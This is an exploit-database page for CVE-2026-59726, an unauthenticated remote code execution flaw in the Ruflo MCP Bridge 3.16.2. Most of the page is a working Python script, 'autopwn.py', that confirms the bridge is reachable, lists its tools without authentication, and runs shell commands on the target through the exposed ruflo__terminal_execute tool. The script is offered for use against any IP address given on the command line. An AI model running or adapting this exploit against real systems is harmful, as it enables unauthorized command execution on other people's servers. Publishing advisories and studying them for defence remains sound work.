---
title: Ruflo MCP Bridge  3.16.2 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026110010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-11-27
fetch_date: 2026-11-28T09:35:04.350046
---

# Ruflo MCP Bridge  3.16.2 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ruflo MCP Bridge 3.16.2 Remote Code Execution** **2026.11.27**  Credit:  **[RufRoot](https://cxsecurity.com/author/RufRoot/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-59726](https://cxsecurity.com/cveshow/CVE-2026-59726/ "Click to see CVE-2026-59726")**  CWE: **[CWE-306](https://cxsecurity.com/cwe/CWE-306 "Click to see CWE-306")** | |

#!/usr/bin/env python3
# =============================================================================
# autopwn.py
# (RufRoot): Unauthenticated RCE in the Ruflo MCP Bridge
# =============================================================================
# Usage: python3 autopwn.py <target\_ip>
# Example: python3 autopwn.py 192.168.x.x
# =============================================================================
import sys
import json
import socket
import subprocess
import tempfile
import os
import time
import base64
import urllib.request
import urllib.error
# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
MCP\_PORT = 3001
LPORT = 4444
TIMEOUT = 10
RED = "\033[0;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[0;34m"
NC = "\033[0m"
def log(msg): print(f"{GREEN}[+]{NC} {msg}")
def info(msg): print(f"{BLUE}[\*]{NC} {msg}")
def warn(msg): print(f"{YELLOW}[!]{NC} {msg}")
def fail(msg): print(f"{RED}[-]{NC} {msg}"); sys.exit(1)
# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def mcp\_call(target, endpoint, method, params=None):
"""Send a JSON-RPC 2.0 request to the MCP bridge."""
url = f"http://{target}:{MCP\_PORT}{endpoint}"
payload = json.dumps({
"jsonrpc": "2.0",
"id": 1,
"method": method,
"params": params or {}
}).encode()
req = urllib.request.Request(
url,
data=payload,
headers={
"Content-Type": "application/json",
"Accept": "application/json, text/event-stream",
},
method="POST"
)
try:
with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
return json.loads(resp.read().decode())
except urllib.error.URLError as e:
fail(f"Request to {url} failed: {e}")
def rce(target, command):
"""Execute a command via ruflo\_\_terminal\_execute."""
resp = mcp\_call(target, "/mcp/devtools", "tools/call", {
"name": "ruflo\_\_terminal\_execute",
"arguments": {"command": command}
})
try:
# The bridge returns JSON inside a text field inside JSON
# Outer: resp["result"]["content"][0]["text"] -> JSON string
# Inner: that JSON string has another "content" array
outer\_text = resp["result"]["content"][0]["text"]
middle = json.loads(outer\_text)
# middle is {"content": [{"type": "text", "text": "{...}"}]}
inner\_text = middle["content"][0]["text"]
inner = json.loads(inner\_text)
return inner.get("output", "").strip()
except Exception:
# Fallback: return whatever we got as string
return str(resp)
def get\_local\_ip():
"""Get the local IP that can reach the target."""
s = socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM)
try:
s.connect(("8.8.8.8", 80))
return s.getsockname()[0]
finally:
s.close()
# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
def banner():
print(f"{BLUE}")
print(" ==================================================")
print(" autopwn - CVE-2026-59726 (RufRoot)")
print(" Unauthenticated RCE in the Ruflo MCP Bridge")
print(" ==================================================")
print(f"{NC}")
print()
# ---------------------------------------------------------------------------
# Steps
# ---------------------------------------------------------------------------
def step1\_check\_bridge(target):
info("Step 1/3 - Checking MCP bridge reachability...")
try:
resp = urllib.request.urlopen(
f"http://{target}:{MCP\_PORT}/health", timeout=TIMEOUT
)
data = json.loads(resp.read().decode())
assert data.get("service") == "mcp-bridge"
log(f"Bridge is up: {data['service']} v{data['version']} "
f"({data['tools']['total']} tools)")
except Exception as e:
fail(f"Bridge not reachable: {e}")
def step2\_verify\_unauth(target):
info("Step 2/3 - Verifying unauthenticated tools/list...")
resp = mcp\_call(target, "/mcp/devtools", "tools/list")
tools = [t["name"] for t in resp.get("result", {}).get("tools", [])]
if "ruflo\_\_terminal\_execute" not in tools:
fail("ruflo\_\_terminal\_execute not found in tools/list")
log(f"tools/list returned {len(tools)} tools without authentication")
log("ruflo\_\_terminal\_execute is present (CWE-306 confirmed)")
def step3\_rce(target):
info("Step 3/3 - Confirming RCE via ruflo\_\_terminal\_execute...")
output = rce(target, "id && hostname")
if "uid=" not in output:
fail(f"RCE did not return expected output: {output}")
log(f"RCE confirmed: {output.split(chr(10))[0]}")
# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
banner()
if len(sys.argv) != 2:
print(f"Usage: python3 autopwn.py <target\_ip>")
sys.exit(1)
target = sys.argv[1]
info(f"Target : {target}:{MCP\_PORT}")
info(f"CVE : CVE-2026-59726 (Ruflo MCP Bridge, pre-3.16.3)")
print()
step1\_check\_bridge(target)
step2\_verify\_unauth(target)
step3\_rce(target)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026110010)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top